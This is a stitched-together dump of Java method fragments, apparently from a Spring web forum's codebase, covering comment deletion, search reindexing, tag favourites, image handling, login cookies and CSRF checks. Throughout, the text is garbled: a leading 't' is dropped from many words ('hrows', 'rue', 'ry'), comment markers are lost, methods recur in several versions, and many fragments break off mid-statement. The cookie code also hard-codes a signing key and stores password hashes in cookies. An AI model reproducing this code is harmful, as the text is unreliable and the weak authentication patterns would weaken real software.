public void updateStatsAfterDelete ( int commentId , int count ) { int opicId = jdbcTemplate . queryForInt ( " SELECT topic FROM comments WHERE id=? " , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , opicId ) ; int groupId = jdbcTemplate . queryForInt ( " SELECT groupid FROM topics WHERE id = ? " , opicId ) ; jdbcTemplate . update ( " UPDATE groups SET stat1=stat1-? WHERE id = ? " , count , groupId ) ; } 
public List < Integer > doDeleteReplys ( int msgid , User user , boolean score ) { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; if ( ! deleted . isEmpty ( ) ) { updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return commentDao . doDeleteReplys ( msgid , user , score ) ; } 
public DeleteCommentResult deleteCommentsByIPAddress ( String ip , Timestamp imeDelta , final User moderator , final String reason ) { return commentDao . deleteCommentsByIPAddress ( ip , imeDelta , moderator , reason ) ; } 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { List < Integer > deletedTopicIds = new ArrayList < Integer > ( ) ; List < Integer > deletedCommentIds = new ArrayList < Integer > ( ) ; userDao . blockWithoutTransaction ( user , moderator , reason ) ; deletedTopicIds = messageDao . deleteAllByUser ( user , moderator ) ; deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , MessageNotFoundException { Topic msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
public void getTopicsFeedYear_commonTest ( ) hrows UserErrorException , TagNotFoundException { when ( agService . getTagId ( " LOR " ) ) . henReturn ( 123 ) ; List < Topic > opicList = opicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( 1 , opicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = opicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( 111 , opicListDto . getGroup ( ) ) ; assertEquals ( 123 , opicListDto . getTag ( ) ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , opicListDto . getDateLimitType ( ) ) ; assertEquals ( TopicListDao . CommitMode . COMMITED_ONLY , opicListDto . getCommitMode ( ) ) ; } 
public CommentsListItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { CommentsListItem item = new CommentsListItem ( ) ; item . setSectionTitle ( rs . getString ( " ptitle " ) ) ; item . setGroupTitle ( rs . getString ( " gtitle " ) ) ; item . setTopicId ( rs . getInt ( " opicid " ) ) ; item . setCommentId ( rs . getInt ( " msgid " ) ) ; item . setTitle ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) ; item . setPostdate ( rs . getTimestamp ( " postdate " ) ) ; return item ; } 
public DeletedListItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new DeletedListItem ( rs ) ; } 
public void checkPostData ( ) hrows Exception { CommentRequest commentRequest = new CommentRequest ( ) ; User user = new User ( Users . getUser1star ( ) ) ; HttpServletRequest request = mock ( HttpServletRequest . class ) ; Errors errors = new BindException ( commentRequest , " commentRequest " ) ; IPBlockInfo ipBlockInfo = new IPBlockInfo ( " 127.0.0.1 " ) ; commentService . checkPostData ( commentRequest , user , ipBlockInfo , request , errors ) ; } 
private void addComment ( int commentId , Integer replyToId , String itle , String body ) { jdbcTemplate . update ( " INSERT INTO comments (id, userid, title, postdate, replyto, deleted, topic, postip, ua_id) " + " VALUES (?, ?, ?, CURRENT_TIMESTAMP, ?, 'f', ?, ?::inet, create_user_agent(?)) " , commentId , 1 , itle , replyToId , opicId , " 127.0.0.1 " , " Integration test User Agent " ) ; jdbcTemplate . update ( " INSERT INTO msgbase (id, message, bbcode) VALUES (?, ?, true) " , 
private void delComment ( int commentId ) { jdbcTemplate . update ( " DELETE FROM msgbase WHERE id=? " , commentId ) ; jdbcTemplate . update ( " DELETE FROM user_events WHERE comment_id=? " , commentId ) ; jdbcTemplate . update ( " DELETE FROM comments WHERE id=? " , commentId ) ; } 
public void editCommentTest ( ) { int commentId = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; ry { addComment ( 
public void updateLatestEditorInfoTest ( ) { int commentId = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; ry { addComment ( 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; int commentId2 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; ry { addComment ( 
private ModelAndView redirectToListPage ( String agName ) { char firstLetter = agName . oLowerCase ( ) . charAt ( 0 ) ; String redirectUrl = TopicListController . agsUrl ( firstLetter ) ; ModelAndView modelAndView = new ModelAndView ( new RedirectView ( redirectUrl ) ) ; return modelAndView ; } 
public static String agsUrl ( char letter ) { return TAGS_URI_TEMPLATE . expand ( letter ) . oString ( ) ; } 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) hrows Exception { if ( handler instanceof ResourceHttpRequestHandler | | handler instanceof DefaultServletHttpRequestHandler ) { return rue ; } String name ; if ( handler instanceof HandlerMethod ) { name = ( ( HandlerMethod ) handler ) . getBeanType ( ) . getSimpleName ( ) ; } else { name = handler . getClass ( ) . getSimpleName ( ) ; } CommonsLogStopWatch watch = new CommonsLogStopWatch ( name ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return rue ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , user , null ) ; TopicMenu opicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentDao.getCommentList(msg, true); 
public void handleMessage ( UpdateMonth msgUpdate ) hrows MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = opicDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } solrServer . commit ( ) ; long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareTopic ( message , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; return mv ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareTopic ( message , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; return mv ; } 
public PreparedTopic prepareTopic ( Topic message , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , false , null , secure , user , null ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure , MessageText ext ) { return prepareMessage ( message , ags , minimizeCut , poll , secure , null , ext ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , MessageText ext ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) ) ; TopicMenu opicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
private Map < Integer , MessageText > loadTexts ( List < Topic > messages ) { return msgbaseDao . getMessageText ( Lists . newArrayList ( 
public Integer apply ( Topic comment ) { return comment . getId ( ) ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , extMap . get ( message . getId ( ) ) ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public static void initCookie ( Properties cookies , HttpServletResponse response ) { if ( cookies . get ( CSRF_COOKIE ) = = null ) { SecureRandom random = new SecureRandom ( ) ; 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = LoginController.ACEGI_COOKIE_NAME; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = Base64.encodeBase64String(tokenValue.getBytes()); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); acegi.setHttpOnly(true); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
private void createCookies ( HttpServletResponse response , HttpSession session , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( configuration . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; cookie . setHttpOnly ( rue ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; CSRFProtectionService . generateCSRFCookie ( response ) ; } 
public static void initCookie ( Properties cookies , HttpServletResponse response ) { if ( cookies . get ( CSRF_COOKIE ) = = null ) { generateCSRFCookie ( response ) ; 
public static void generateCSRFCookie ( HttpServletResponse response ) { SecureRandom random = new SecureRandom ( ) ; byte [ ] value = new byte [ 16 ] ; random . nextBytes ( value ) ; Cookie cookie = new Cookie ( CSRF_COOKIE , new String ( Base64 . encodeBase64 ( value ) ) ) ; cookie . setMaxAge ( TWO_YEARS ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; } 
public String formatUrlBody ( int maxLength ) hrows URIException { String all = getURIReference ( ) ; String scheme = getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( _true_lor_url ) { if ( uriWithoutScheme . length ( ) < maxLength + 1 ) { 
public String formatUrlBody ( int maxLength ) hrows URIException { String all = getURIReference ( ) ; String scheme = getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; int rueMaxLength = maxLength - 3 ; '...' if(_true_lor_url) { if(uriWithoutScheme.length() < trueMaxLength + 1) { 
private void createCookies ( HttpServletResponse response , HttpServletRequest request , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( configuration . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; cookie . setHttpOnly ( rue ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , request . getSession ( ) ) ; CSRFProtectionService . generateCSRFCookie ( request , response ) ; } 
private static String makeLogString ( String message , String remoteAddress , String xForwardedFor ) { StringBuilder logMessage = new StringBuilder ( ) ; logMessage . append ( message ) . append ( " ; ip: " ) . append ( remoteAddress ) ; if ( xForwardedFor ! = null ) { logMessage . append ( " XFF: " ) . append ( xForwardedFor ) ; } return logMessage . oString ( ) ; } 
public static void generateCSRFCookie ( HttpServletRequest request , HttpServletResponse response ) { SecureRandom random = new SecureRandom ( ) ; byte [ ] value = new byte [ 16 ] ; random . nextBytes ( value ) ; String oken = new String ( Base64 . encodeBase64 ( value ) ) ; Cookie cookie = new Cookie ( CSRF_COOKIE , oken ) ; cookie . setMaxAge ( TWO_YEARS ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; request . setAttribute ( CSRF_COOKIE , oken ) ; } 
public String formatUrlBody ( int maxLength ) hrows URIException { String all = getURIReference ( ) ; String scheme = getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; int rueMaxLength = maxLength - 3 ; '...' if(_true_lor_url) { if(uriWithoutScheme.length() < maxLength + 1) { 
public static boolean checkCSRF ( HttpServletRequest request ) { String cookieValue = ( String ) request . getAttribute ( CSRF_ATTRIBUTE ) ; if ( Strings . isNullOrEmpty ( cookieValue ) ) { logger . info ( " Missing CSRF cookie " ) ; return false ; } String inputValue = request . getParameter ( CSRF_INPUT_NAME ) ; if ( Strings . isNullOrEmpty ( inputValue ) ) { logger . info ( " Missing CSRF input " ) ; return false ; } boolean r = inputValue . equals ( cookieValue ) ; if ( ! r ) { logger . info ( String . format ( " Flood protection (CSRF cookie differs: cookie=%s param=%s) ip=%s " , cookieValue , inputValue , request . getRemoteAddr ( ) ) ) ; } return r ; } 
public String processAction ( HttpServletRequest request , String action ) { return action ; } 
public String processFormFieldValue ( HttpServletRequest request , String name , String value , String ype ) { return value ; } 
public String processUrl ( HttpServletRequest request , String url ) { return url ; } 
public static void generateCSRFCookie ( HttpServletRequest request , HttpServletResponse response ) { SecureRandom random = new SecureRandom ( ) ; byte [ ] value = new byte [ 16 ] ; random . nextBytes ( value ) ; String oken = new String ( Base64 . encodeBase64 ( value ) ) ; Cookie cookie = new Cookie ( CSRF_COOKIE , oken ) ; cookie . setMaxAge ( TWO_YEARS ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; request . setAttribute ( CSRF_ATTRIBUTE , oken ) ; } 
public static Set < Integer > makeHideSet ( UserDao userDao , CommentList comments , int filterChain , Set < Integer > ignoreList ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public boolean isHaveAnswers ( ) { return ! childs . isEmpty ( ) ; } 
public void updateLatestEditorInfo ( User editor , Comment original , Comment comment ) { List < EditHistoryDto > editHistoryDtoList = editHistoryService . getEditInfo ( original . getId ( ) , EditHistoryObjectTypeEnum . COMMENT ) ; commentDao . updateLatestEditorInfo ( original . getId ( ) , 
public void updateLastModifiedToCurrentTime ( int opicId ) { jdbcTemplate . update ( updateLastmodToCurrentTime , 
public String format ( String ext , boolean secure ) { String escapedText = StringUtil . escapeHtml ( ext ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken = formatURL ( oken , secure ) ; sb . append ( formattedToken ) ; } return sb . oString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
public ModelAndView register ( @ModelAttribute ( " form " ) RegisterRequest form , HttpServletResponse response ) hrows Exception { response . setHeader ( " Cache-Control " , " no-store, no-cache, must-revalidate " ) ; return new ModelAndView ( " register " ) ; } 
public static boolean checkCSRF ( HttpServletRequest request ) { String cookieValue = ( String ) request . getAttribute ( CSRF_ATTRIBUTE ) ; if ( Strings . isNullOrEmpty ( cookieValue ) ) { logger . info ( " Missing CSRF cookie " ) ; return false ; } String inputValue = request . getParameter ( CSRF_INPUT_NAME ) ; if ( Strings . isNullOrEmpty ( inputValue ) ) { logger . info ( " Missing CSRF input " ) ; return false ; } boolean r = inputValue . equals ( cookieValue ) ; if ( ! r ) { logger . info ( String . format ( " Flood protection (CSRF cookie differs: cookie=%s param=%s) ip=%s url=%s " , cookieValue , inputValue , request . getRemoteAddr ( ) , request . getRequestURI ( ) ) ) ; } return r ; } 
public static boolean checkCSRF ( HttpServletRequest request ) { String cookieValue = ( String ) request . getAttribute ( CSRF_ATTRIBUTE ) ; if ( Strings . isNullOrEmpty ( cookieValue ) ) { logger . info ( " Missing CSRF cookie " ) ; return false ; } String inputValue = request . getParameter ( CSRF_INPUT_NAME ) ; if ( Strings . isNullOrEmpty ( inputValue ) ) { logger . info ( " Missing CSRF input " ) ; return false ; } boolean r = inputValue . rim ( ) . equals ( cookieValue . rim ( ) ) ; if ( ! r ) { logger . info ( String . format ( " Flood protection (CSRF cookie differs: cookie=%s param=%s) ip=%s url=%s " , cookieValue , inputValue , request . getRemoteAddr ( ) , request . getRequestURI ( ) ) ) ; } return r ; } 
public ModelAndView agFeed ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response , @PathVariable String ag ) hrows Exception { opicListForm . setTag ( ag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " counter " , agService . getCounter ( ag ) ) ; modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( agService . getTagId ( ag ) ) ) ; modelAndView . setViewName ( " ag-topics " ) ; return modelAndView ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; List < String > r = userTagService . addMultiplyTags ( user , agName , rue ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( request , agName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ry { int id = userTagService . favoriteAdd ( user , agName ) ; 
Map < String , Object > favoriteTagDelJSON ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int agId = userTagService . favoriteDel ( user , agName ) ; return ImmutableMap . < String , Object > of ( " count " , userTagService . countFavs ( agId ) ) ; } 
public int countFavs ( int agId ) { return jdbcTemplate . queryForInt ( " SELECT count(*) FROM user_tags WHERE tag_id=:tagId AND is_favorite " , 
public int favoriteAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagId ( agName ) ; userTagDao . addTag ( user . getId ( ) , agId , rue ) ; return agId ; } 
public int favoriteDel ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagId ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agId , rue ) ; return agId ; } 
public int countFavs ( int id ) { return userTagDao . countFavs ( id ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < GalleryItem > list = imageDao . getGalleryItems ( COUNT_ITEMS ) ; mav . addObject ( " items " , list ) ; return mav ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " original " ) ) ; item . setIcon ( rs . getString ( " icon " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; item . setHtmlPath ( htmlPath ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public Image imageForTopic ( Topic opic ) { return jdbcTemplate . queryForObject ( " SELECT id, topic, original, icon FROM images WHERE topic=? " , 
public Image mapRow ( ResultSet rs , int i ) hrows SQLException { return new Image ( rs . getInt ( " id " ) , 
public void saveImage ( int opicId , String original , String icon ) { jdbcTemplate . update ( " INSERT INTO images (topic, original, icon) VALUES (?,?,?) " , opicId , original , icon ) ; } 
public PreparedTopic prepareTopic ( Topic message , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , false , null , secure , user , null , null ) ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < String > ags , Poll newPoll , boolean secure , String ext , Image image ) { return prepareMessage ( message , 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , MessageText ext , Image image ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
private PreparedImage prepareImage ( Image image , boolean secure ) { String mediumName = image . getMedium ( ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = image . getIcon ( ) ; } ry { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , null , extMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) hrows ServletException , IOException { if ( filterConfig = = null ) { return ; } HttpServletRequest hsr = ( HttpServletRequest ) servletRequest ; String path = hsr . getServletPath ( ) ; if ( ! path . endsWith ( " .css " ) & & ! path . endsWith ( " .png " ) & & ! path . endsWith ( " .jpg " ) ) { ry { Template mpl = new Template ( ( HttpServletRequest ) servletRequest , ( HttpServletResponse ) servletResponse , userDao , configuration ) ; servletRequest . setAttribute ( " emplate " , mpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public Image imageForTopic ( @Nonnull Topic opic ) { return jdbcTemplate . queryForObject ( " SELECT id, topic, original, icon FROM images WHERE topic=? " , 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , MessageText ext , @Nullable Image image ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
private PreparedImage prepareImage ( @Nonnull Image image , boolean secure ) { Preconditions . checkNotNull ( image ) ; String mediumName = image . getMedium ( ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = image . getIcon ( ) ; } ry { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
private PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure , boolean rss , Template mpl , Topic opic ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , comments , secure , rss , mpl , opic ) ; } 
private boolean isEditableNow ( boolean moderatorMode , boolean moderatorAllowEditComments , boolean commentEditingAllowedIfAnswersExists , int commentScoreValueForEditing , int userScore , boolean authored , boolean haveAnswers , int commentExpireMinutesForEdit , long commentTimestamp ) { Boolean editable = moderatorMode & & moderatorAllowEditComments ; long nowTimestamp = new java . util . Date ( ) . getTime ( ) ; if ( ! editable & & authored ) { boolean isbyMinutesEnable ; if ( commentExpireMinutesForEdit ! = 0 ) { long deltaTimestamp = commentExpireMinutesForEdit * 60 * 1000 ; isbyMinutesEnable = commentTimestamp + deltaTimestamp > nowTimestamp ; } else { isbyMinutesEnable = rue ; } boolean isbyAnswersEnable = rue ; if ( ! commentEditingAllowedIfAnswersExists & & haveAnswers ) { isbyAnswersEnable = false ; } boolean isByScoreEnable = rue ; if ( commentScoreValueForEditing > userScore ) { isByScoreEnable = false ; } editable = isbyMinutesEnable & isbyAnswersEnable & isByScoreEnable ; } return editable ; } 
private boolean isDeletableNow ( boolean moderatorMode , boolean expired , boolean authored , boolean haveAnswers , long commentTimestamp ) { long nowTimestamp = new java . util . Date ( ) . getTime ( ) ; return moderatorMode | | ( ! expired & & 
public PreparedComment prepareCommentForReplayto ( Comment comment , boolean secure ) hrows UserNotFoundException { return prepareComment ( comment , null , secure , false , null , null ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , String message , boolean secure ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure ) ; return new PreparedComment ( comment , 
